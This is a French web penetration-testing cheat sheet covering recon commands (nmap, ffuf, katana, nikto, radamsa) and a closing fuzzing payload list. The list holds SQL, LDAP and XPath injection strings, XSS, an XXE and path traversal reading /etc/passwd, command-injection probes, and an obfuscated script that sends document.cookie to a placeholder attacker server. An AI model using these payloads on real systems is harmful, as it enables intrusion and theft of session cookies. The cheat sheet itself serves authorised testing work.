# Web

## burp & Zap (crawl + discovery)

* [ZAP](https://www.zaproxy.org/)
* [Burp](https://portswigger.net/burp)

Utiliser la documentation et l'interface graphique :

* Découverte manuelles via navigateur + proxy
* Spider
* Fuzzer

## webservices (sous domaines DNS et virtual host)

```bash
nmap -p 80 --script dns-brute.nse vulnweb.com 
```

## vitual hosts

```bash
nmap -p 80 --script hostmap-bfk.nse nmap.org 
```

## enum folders

```bash
nmap --script http-enum 192.168.10.55
nmap --script -http-enum --script-args http-enum.basepath='pub/' 192.168.10.55
nmap --script http-title -sV -p 80 192.168.1.0/24
```

## httpx (checks and basics info)

[httpx](https://github.com/projectdiscovery/httpx/releases)

## katana (crawler)

[Katana on Github](https://github.com/projectdiscovery/katana)

```powershell
./katana.exe -u <url>
```

## Nuclei

[Nuclei](https://github.com/projectdiscovery/nuclei)

## ffuf (discovery)

[ffuf on Github](https://github.com/ffuf/ffuf)

## Nikto (scanner)

nikto -host htttp://<victim> -p <port> [ -ssl ] [-vhost]

## cewl (list generator)

pour creer des wordlists et énumer le site

## ffuf

utiliser ffuf et les [seclists](https://github.com/danielmiessler/SecLists)

`apt install ffuf -y`

### repertoire à la racine

```sh
ffuf -w .\SecLists\Discovery\Web-Content\api\api-endpoints.txt:FUZZ -u https://localhost:3000/FUZZ -v -fc 401,403,404
```

### trouver les extentions acceptées par la cible

```sh
ffuf -w /opt/useful/SecLists/recu:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
```

### extension et recursivité (les repertoires son testé quand meme automatiquement)

```sh
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php,.txt,.zip,.html,.js,.jsp,.txt
```

### find subdomains

```sh
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.hackthebox.eu/
```

### find vhost

```sh
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs <taille de la réponse à exclure>
```

### find GET parameters

```sh
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs <taille de la réponse à exclure>
```

### find POST paramaters

```sh
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs <taille de la réponse à exclure>
```

### options ffuf pour logger les résultats

```sh
-of csv -o ffuf-result.txt
```

(VScode and search expected result)

### Envoyer une requete depuis un fichier RAW (depuis ZAP ou Burp)

```sh
.\ffuf.exe -request .\vti.raw -w test
```

### options ffuf proxy

```sh
-replay-proxy http://127.0.0.1:8888
```

### ffuf + pwsh

```powershell
mkdir resultats -ea silentlycontinue
gc ./urls.txt |%{

    $url = $_
    $log = $url.Replace("://","-").Replace("/","")

    ./ffuf.exe `
    -w ./directory-list-2.3-medium.txt:FUZZ `
    -u  "${url}FUZZ/" `
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' `
    -of csv `
    -o "./resultats/${log}.csv" `
    -v
}
```

## ffuf avec radamsa

## exemple for testing json

```sh
echo '{"cle"="value"}' |.\radamsa.exe -n 10
```

## fuff and radamsa (cf. RECON for fuff commands)

```sh
ffuf -u http://codingo.io/FUZZ -w ./wordlist -replay-proxy http://127.0.0.1:8888
```

## Generate 1000 example payloads

```sh
radamsa -n 1000 -o %n.txt example1.txt example2.txt
```

This results into files 1.txt ... 1000.txt
Now we can just read the payload data in a loop from file for ffuf

```sh
ffuf --input-cmd 'cat $FFUF_NUM.txt' -H "Content-Type: application/json" -X POST -u https://ffuf.io.fi/ -mc all -fc 400
```

## Fuzzing list

```txt
# Minimalist fuzzing List dojo 101
<z>"z'z`%}})z${{z\
https://127.0.0.1/
<script src=//127.0.0.1/test.js>
*
+
-
/
\\
=
&
%
$
;
[
]
(
)
|
?
,
\"
'
`
@
#
!
.
:
<
>
«
»
}
{
0
-1
42424242
\n
\r
\r\n
\\n
\\r
\\r\\n
\\s
//
//*
*/*
@*
undefined
undef
null
NULL
(null)
nil
NIL
true
false
True
False
TRUE
FALSE
None
NaN
()
{}
[]
<>
\\
0xdeadbeaf
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
`whoami`
uname%20-a
%3Bcat%20/etc/passwd
cmd.exe
<!--#exec cmd=\"/bin/ps ax\"-->
}}<tag>
https://127.1/
ftp://0x7f000001/
smb://0000::1:445/
file:///etc/passwd
./../../../etc/passwd
zip:///filename_path
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
test}}{
foo<
foo'
foo<!--
&foo
]]>
foo</bar>\"
*)(&
,*)(|&
pwd)
*)(|(*
*))%00
,admin)(&)
user=*)(uid=*))(|(uid=*
test&foo=\"
'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
||6
'||'6
(||6)
' OR 1=1--
OR 1=1
' OR '1'='1
; OR '1'='1'
' or 1=1--
\" or 1=1--
' or 1=1 /*
or 1=1--
' or 'a'='a
\" or \"a\"=\"a
') or ('a'='a
Admin' OR '
<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xee;</foo>
admin*
admin*)((|userPassword=*)
*)(uid=*))(|(uid=*
*|
'+or+'1'='1
'+or+''='
x'+or+1=1+or+'x'='y
count(/child::node())
x'+or+name()='username'+or+'x'='y
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
<script>alert(0)</script>
<iframe src=javascript:alert(1)>
\"><img src=x onerror=prompt(1);>
<script>alert(1)<!–
<a onmouseover\"alert(1)\">test</a>
<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```txt


